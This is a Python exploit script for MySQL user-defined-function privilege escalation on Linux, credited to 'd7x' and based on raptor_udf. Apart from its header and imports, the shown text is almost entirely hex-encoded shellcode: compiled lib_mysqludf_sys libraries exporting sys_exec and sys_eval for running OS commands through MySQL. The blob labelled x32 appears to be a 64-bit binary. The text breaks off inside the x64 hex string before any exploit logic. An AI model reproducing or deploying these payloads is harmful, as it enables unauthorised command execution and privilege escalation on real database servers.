#!/usr/bin/env python

# Exploit Title: MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit
# Date: 24/01/2019
# Exploit Author: d7x
# Vendor Homepage: https://www.mysql.com
# Software Link: www.mysql.com
# Version: MySQL 4.x/5.x
# Tested on: Debian GNU/Linux 8.11 / mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3
# CVE : N/A

'''
*** MySQL User-Defined (Linux) x32 / x86_64 sys_exec function local privilege escalation exploit ***


UDF lib shellcodes retrieved from metasploit
(there are windows .dll libraries within metasploit as well so this could be easily ported to Windows)

Based on the famous raptor_udf.c by Marco Ivaldi (EDB ID: 1518)
CVE: N/A
References:
https://dev.mysql.com/doc/refman/5.5/en/create-function-udf.html
https://www.exploit-db.com/exploits/1518
https://www.exploit-db.com/papers/44139/ - MySQL UDF Exploitation by Osanda Malith Jayathissa (@OsandaMalith)

Tested on 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux

@d7x_real
https://d7x.promiselabs.net
https://www.promiselabs.net
'''

import sys
import subprocess
import platform, random
import argparse
import os
import re
import pty

shellcode_x32 = "7f454c4602010100000000000000000003003e00010000000000000000000000400000000000000088390000000000000000000040003800090040001c001b000100000004000000000000000000000000000000000000000000000000000000b009000000000000b00900000000000000100000000000000100000005000000001000000000000000100000000000000010000000000000f508000000000000f50800000000000000100000000000000100000004000000002000000000000000200000000000000020000000000000d402000000000000d40200000000000000100000000000000100000006000000102e000000000000103e000000000000103e0000000000007002000000000000780200000000000000100000000000000200000006000000202e000000000000203e000000000000203e000000000000c001000000000000c0010000000000000800000000000000040000000400000038020000000000003802000000000000380200000000000024000000000000002400000000000000040000000000000050e574640400000004200000000000000420000000000000042000000000000094000000000000009400000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000102e000000000000103e000000000000103e000000000000f001000000000000f0010000000000000100000000000000040000001400000003000000474e55004693a827cdb8aec0ef6bcd070214501685db39f3000000000300000011000000020000000700000000080240811944c81ca0400290006883110000001500000016000000a868be12aa5fbe12c2138affad73d1c5755bb0737e8b92cd3a9fd4a0c2f9bfbace2cc0ba78722788663c76900a5911fec4a62c1c1e7066a9371974ec000000000000000000000000000000000000000000000000c70000001200000000000000000000000000000000000000f800000012000000000000000000000000000000000000007601000012000000000000000000000000000000000000001000000020000000000000000000000000000000000000000c0100001200000000000000000000000000000000000000ce00000012000000000000000000000000000000000000003a01000012000000000000000000000000000000000000008401000012000000000000000000000000000000000000007e0100001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000050100001200000000000000000000000000000000000000e200000012000000000000000000000000000000000000006e01000012000000000000000000000000000000000000006801000012000000000000000000000000000000000000002c00000020000000000000000000000000000000000000004600000022000000000000000000000000000000000000003101000012000c00ba160000000000002f000000000000005f01000012000c008f170000000000005c01000000000000d500000012000c00b2130000000000005c010000000000005500000012000c00b91100000000000087000000000000007000000012000c0040120000000000000b00000000000000b000000012000c0047130000000000000b000000000000001301000012000c0014160000000000009b00000000000000bf00000012000c0052130000000000006000000000000000fd00000012000c003a15000000000000da000000000000008d00000012000c004b120000000000006b000000000000004f01000012000c0084170000000000000b00000000000000e900000012000c000e150000000000002c000000000000002101000012000c00af160000000000000b000000000000004101000012000c00e9160000000000009b00000000000000a300000012000c00b6120000000000009100000000000000005f5f676d6f6e5f73746172745f5f005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65006c69625f6d7973716c7564665f7379735f696e666f5f696e6974006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f007379735f6765745f696e6974007379735f6765745f6465696e6974007379735f67657400676574656e76007374726c656e007379735f7365745f696e6974006d616c6c6f63007379735f7365745f6465696e69740066726565007379735f736574006d656d63707900736574656e76007379735f657865635f696e6974007379735f657865635f6465696e6974007379735f657865630073797374656d007379735f6576616c5f696e6974007379735f6576616c5f6465696e6974007379735f6576616c00706f70656e007265616c6c6f63007374726e6370790066676574730070636c6f7365006c6962632e736f2e3600474c4942435f322e313400474c4942435f322e322e35000000020002000200010002000200020002000200010003000200020002000100020001000100010001000100010001000100010001000100010001000100010000000000010002008b010000100000000000000094919606000003009501000010000000751a690900000200a001000000000000103e0000000000000800000000000000b011000000000000183e00000000000008000000000000007011000000000000784000000000000008000000000000007840000000000000e03f00000000000006000000040000000000000000000000e83f000000000000060000000a0000000000000000000000f03f000000000000060000000f0000000000000000000000f83f000000000000060000001000000000000000000000001840000000000000070000000100000000000000000000002040000000000000070000000200000000000000000000002840000000000000070000000300000000000000000000003040000000000000070000000500000000000000000000003840000000000000070000000600000000000000000000004040000000000000070000000700000000000000000000004840000000000000070000000800000000000000000000005040000000000000070000000900000000000000000000005840000000000000070000000b00000000000000000000006040000000000000070000000c00000000000000000000006840000000000000070000000d00000000000000000000007040000000000000070000000e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004883ec08488b05dd2f00004885c07402ffd04883c408c3000000000000000000ff35e22f0000ff25e42f00000f1f4000ff25e22f00006800000000e9e0ffffffff25da2f00006801000000e9d0ffffffff25d22f00006802000000e9c0ffffffff25ca2f00006803000000e9b0ffffffff25c22f00006804000000e9a0ffffffff25ba2f00006805000000e990ffffffff25b22f00006806000000e980ffffffff25aa2f00006807000000e970ffffffff25a22f00006808000000e960ffffffff259a2f00006809000000e950ffffffff25922f0000680a000000e940ffffffff258a2f0000680b000000e930ffffffff25022f000066900000000000000000488d3d792f0000488d05722f00004839f87415488b05c62e00004885c07409ffe00f1f8000000000c30f1f8000000000488d3d492f0000488d35422f00004829fe4889f048c1ee3f48c1f8034801c648d1fe7414488b05952e00004885c07408ffe0660f1f440000c30f1f8000000000f30f1efa803d052f000000752b5548833d722e0000004889e5740c488b3de62e0000e859ffffffe864ffffffc605dd2e0000015dc30f1f00c30f1f8000000000f30f1efae977ffffff554889e548897de8488975e0488955d8488b45e08b0085c07463488b45d848ba4e6f20617267756d48b9656e747320616c6c4889104889480848be6f7765642028756448bf663a206c69625f6d488970104889781848ba7973716c7564665f48b97379735f696e666f488950204889482866c740302900c645ff01eb04c645ff000fb645ff5dc3554889e548897df8905dc3554889e548897df8488975f0488955e848894de04c8945d84c894dd0488b45e848ba6c69625f6d79737148b96c7564665f7379734889104889480848be2076657273696f6e48897010c7401820302e3066c7401c2e33c6401e00488b45e048c7001e000000488b45e85dc3554889e548897df8488975f0488955e8488b45f08b0083f801751c488b45f0488b40088b0085c0750e488b45f8c60001b800000000eb58488b45e848ba457870656374656448b92065786163746c794889104889480848be206f6e652073747248bf696e672074797065488970104889781848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54883ec4048897de8488975e0488955d848894dd04c8945c84c894dc0488b45e0488b4010488b004889c7e8abfcffff488945f848837df8007509488b45c8c60001eb13488b45f84889c7e8cbfcffff488b55d0488902488b45f8c9c3554889e54883ec2048897df8488975f0488955e8488b45f08b0083f8027448488b45e848be457870656374656448bf2065786163746c794889304889780848b92074776f2061726748894810c74018756d656e66c7401c7473c6401e00b801000000e9f3000000488b45f0488b40088b0085c07453488b45e848be457870656374656448bf20737472696e67204889304889780848ba7479706520666f7248b9206e616d65207061488950104889481848b972616d657465720048894820b801000000e992000000488b45f0488b40084883c004c70000000000488b45f0488b4018488b10488b45f0488b40184883c008488b004801d04883c0024889c7e80bfcffff4889c2488b45f848895010488b45f8488b40104885c0753a488b45e848be436f756c64206e6f48bf7420616c6c6f63614889304889780848b97465206d656d6f724889481066c740187900b801000000eb05b800000000c9c3554889e54883ec1048897df8488b45f8488b40104885c07410488b45f8488b40104889c7e809fbffff90c9c3554889e54883ec3048897de8488975e0488955d848894dd0488b45e8488b4010488945f8488b45e0488b4018488b00488d5001488b45f84801d0488945f0488b45e0488b4018488b10488b45e0488b4010488b08488b45f84889ce4889c7e813fbffff488b45e0488b4018488b10488b45f84801d0c60000488b45e0488b40184883c008488b10488b45e0488b40104883c008488b08488b45f04889ce4889c7e8d1faffff488b45e0488b40184883c008488b10488b45f04801d0c60000488b4df0488b45f8ba010000004889ce4889c7e850faffff4898c9c3554889e548897de8488975e0488955d8c745fc00000000488b45e08b0083f801751f488b45e0488b50088b45fc48c1e0024801d08b0085c07507b800000000eb58488b45d848be457870656374656448bf2065786163746c794889304889780848ba206f6e652073747248b9696e672074797065488950104889481848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54883ec2048897df8488975f0488955e848894de0488b45f0488b4010488b004889c7e89bf9ffff4898c9c3554889e548897de8488975e0488955d8c745fc00000000488b45e08b0083f801751f488b45e0488b50088b45fc48c1e0024801d08b0085c07507b800000000eb58488b45d848be457870656374656448bf2065786163746c794889304889780848ba206f6e652073747248b9696e672074797065488950104889481848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54881ec500400004889bdd8fbffff4889b5d0fbffff488995c8fbffff48898dc0fbffff4c8985b8fbffff4c898db0fbffffbf01000000e8f2f8ffff488985c8fbffff48c745f800000000488b85d0fbffff488b4010488b00488d150e0800004889d64889c7e8e3f8ffff488945f0eb64488d85e0fbffff4889c7e85ef8ffff488945e8488b55f8488b45e84801c2488b85c8fbffff4889d64889c7e89df8ffff488985c8fbffff488b95c8fbffff488b45f8488d0c02488b55e8488d85e0fbffff4889c64889cfe8f1f7ffff488b45e8480145f8488b55f0488d85e0fbffffbe000400004889c7e821f8ffff4885c00f857bffffff488b45f04889c7e8fcf7ffff488b85c8fbffff0fb60084c0740a4883bdc8fbffff00750c488b85b8fbffffc60001eb2a488b95c8fbffff488b45f84801d0c60000488b85c8fbffff4889c7e898f7ffff488b95c0fbffff488902488b85c8fbffffc9c3004883ec084883c408c300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000072000000011b033b90000000110000001cf0ffffac000000ecf0ffffd4000000b5f1ffffec0000003cf2ffff0c01000047f2ffff2c010000b2f2ffff4c01000043f3ffff6c0100004ef3ffff8c010000aef3ffffac0100000af5ffffcc01000036f5ffffec01000010f6ffff0c020000abf6ffff2c020000b6f6ffff4c020000e5f6ffff6c02000080f7ffff8c0200008bf7ffffac0200001400000000000000017a5200017810011b0c070890010000240000001c00000068efffffd0000000000e10460e184a0f0b770880003f1a3b2a33242200000000140000004400000010f0ffff0800000000000000000000001c0000005c000000c1f0ffff8700000000410e108602430d0602820c070800001c0000007c00000028f1ffff0b00000000410e108602430d06460c07080000001c0000009c00000013f1ffff6b00000000410e108602430d0602660c070800001c000000bc0000005ef1ffff9100000000410e108602430d06028c0c070800001c000000dc000000cff1ffff0b00000000410e108602430d06460c07080000001c000000fc000000baf1ffff6000000000410e108602430d06025b0c070800001c0000001c010000faf1ffff5c01000000410e108602430d060357010c0708001c0000003c01000036f3ffff2c00000000410e108602430d06670c07080000001c0000005c01000042f3ffffda00000000410e108602430d0602d50c070800001c0000007c010000fcf3ffff9b00000000410e108602430d0602960c070800001c0000009c01000077f4ffff0b00000000410e108602430d06460c07080000001c000000bc01000062f4ffff2f00000000410e108602430d066a0c07080000001c000000dc01000071f4ffff9b00000000410e108602430d0602960c070800001c000000fc010000ecf4ffff0b00000000410e108602430d06460c07080000001c0000001c020000d7f4ffff5c01000000410e108602430d060357010c070800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b011000000000000701100000000000001000000000000008b010000000000000c0000000000000000100000000000000d00000000000000ec180000000000001900000000000000103e0000000000001b0000000000000008000000000000001a00000000000000183e0000000000001c000000000000000800000000000000f5feff6f0000000060020000000000000500000000000000c8050000000000000600000000000000c8020000000000000a00000000000000ac010000000000000b000000000000001800000000000000030000000000000000400000000000000200000000000000200100000000000014000000000000000700000000000000170000000000000090080000000000000700000000000000e8070000000000000800000000000000a80000000000000009000000000000001800000000000000feffff6f00000000b807000000000000ffffff6f000000000100000000000000f0ffff6f000000007407000000000000f9ffff6f00000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000203e000000000000000000000000000000000000000000003610000000000000461000000000000056100000000000006610000000000000761000000000000086100000000000009610000000000000a610000000000000b610000000000000c610000000000000d610000000000000e61000000000000078400000000000004743433a202844656269616e2031312e322e302d3230292031312e322e300000000000000000000000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000002000c00001100000000000000000000000000000e00000002000c00301100000000000000000000000000002100000002000c00701100000000000000000000000000003700000001001700804000000000000001000000000000004300000001001200183e00000000000000000000000000006a00000002000c00b01100000000000000000000000000007600000001001100103e0000000000000000000000000000950000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000a800000001001000d0220000000000000000000000000000000000000400f1ff00000000000000000000000000000000b600000002000d00ec180000000000000000000000000000bc0000000100160078400000000000000000000000000000c900000001001300203e0000000000000000000000000000d200000000000f0004200000000000000000000000000000e50000000100160080400000000000000000000000000000f100000001001500004000000000000000000000000000007b01000002000900001000000000000000000000000000000701000012000000000000000000000000000000000000001a01000012000000000000000000000000000000000000002b01000012000000000000000000000000000000000000003f01000020000000000000000000000000000000000000005b01000012000c0047130000000000000b000000000000006a01000012000c00ba160000000000002f000000000000007301000012000c0014160000000000009b00000000000000810100001200000000000000000000000000000000000000940100001200000000000000000000000000000000000000a70100001200000000000000000000000000000000000000ba0100001200000000000000000000000000000000000000cd0100001200000000000000000000000000000000000000df01000012000c008f170000000000005c01000000000000e801000012000c0052130000000000006000000000000000f00100002000000000000000000000000000000000000000ff01000012000c003a15000000000000da000000000000000702000012000000000000000000000000000000000000001902000012000c004b120000000000006b000000000000002f02000012000000000000000000000000000000000000004202000012000c0040120000000000000b000000000000005f02000012000c00b2130000000000005c010000000000006c02000012000c0084170000000000000b000000000000007c0200001200000000000000000000000000000000000000900200001200000000000000000000000000000000000000a202000012000c000e150000000000002c00000000000000b102000012000c00af160000000000000b00000000000000c102000012000c00e9160000000000009b00000000000000cf02000012000c00b6120000000000009100000000000000dc0200002000000000000000000000000000000000000000f602000022000000000000000000000000000000000000001103000012000c00b91100000000000087000000000000000063727473747566662e6300646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e30005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006c69625f6d7973716c7564665f7379732e63005f5f4652414d455f454e445f5f005f66696e69005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e7640474c4942435f322e322e35006672656540474c4942435f322e322e35007374726e63707940474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65007379735f6765745f6465696e6974007379735f65786563007379735f657865635f696e697400736574656e7640474c4942435f322e322e35007374726c656e40474c4942435f322e322e350073797374656d40474c4942435f322e322e350070636c6f736540474c4942435f322e322e3500666765747340474c4942435f322e322e35007379735f6576616c007379735f676574005f5f676d6f6e5f73746172745f5f007379735f736574006d656d63707940474c4942435f322e3134006c69625f6d7973716c7564665f7379735f696e666f006d616c6c6f6340474c4942435f322e322e35006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f7365745f696e6974007379735f6576616c5f6465696e6974007265616c6c6f6340474c4942435f322e322e3500706f70656e40474c4942435f322e322e35007379735f7365745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f696e6974007379735f6765745f696e6974005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a6540474c4942435f322e322e35006c69625f6d7973716c7564665f7379735f696e666f5f696e697400002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b0000000700000002000000000000003802000000000000380200000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000600200000000000060020000000000006800000000000000030000000000000008000000000000000000000000000000380000000b0000000200000000000000c802000000000000c802000000000000000300000000000004000000010000000800000000000000180000000000000040000000030000000200000000000000c805000000000000c805000000000000ac0100000000000000000000000000000100000000000000000000000000000048000000ffffff6f020000000000000074070000000000007407000000000000400000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000b807000000000000b807000000000000300000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000e807000000000000e807000000000000a8000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000900800000000000090080000000000002001000000000000030000001500000008000000000000001800000000000000780000000100000006000000000000000010000000000000001000000000000017000000000000000000000000000000040000000000000000000000000000007300000001000000060000000000000020100000000000002010000000000000d0000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000f010000000000000f01000000000000008000000000000000000000000000000080000000000000008000000000000008700000001000000060000000000000000110000000000000011000000000000eb070000000000000000000000000000100000000000000000000000000000008d000000010000000600000000000000ec18000000000000ec180000000000000900000000000000000000000000000004000000000000000000000000000000930000000100000002000000000000000020000000000000002000000000000002000000000000000000000000000000010000000000000000000000000000009b000000010000000200000000000000042000000000000004200000000000009400000000000000000000000000000004000000000000000000000000000000a9000000010000000200000000000000982000000000000098200000000000003c02000000000000000000000000000008000000000000000000000000000000b30000000e0000000300000000000000103e000000000000102e0000000000000800000000000000000000000000000008000000000000000800000000000000bf0000000f0000000300000000000000183e000000000000182e0000000000000800000000000000000000000000000008000000000000000800000000000000cb000000060000000300000000000000203e000000000000202e000000000000c00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000e03f000000000000e02f0000000000002000000000000000000000000000000008000000000000000800000000000000d4000000010000000300000000000000004000000000000000300000000000007800000000000000000000000000000008000000000000000800000000000000dd000000010000000300000000000000784000000000000078300000000000000800000000000000000000000000000008000000000000000000000000000000e3000000080000000300000000000000804000000000000080300000000000000800000000000000000000000000000001000000000000000000000000000000e8000000010000003000000000000000000000000000000080300000000000001f00000000000000000000000000000001000000000000000100000000000000010000000200000000000000000000000000000000000000a030000000000000c8040000000000001a000000140000000800000000000000180000000000000009000000030000000000000000000000000000000000000068350000000000002c030000000000000000000000000000010000000000000000000000000000001100000003000000000000000000000000000000000000009438000000000000f100000000000000000000000000000001000000000000000000000000000000"
shellcode_x64 = "7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f0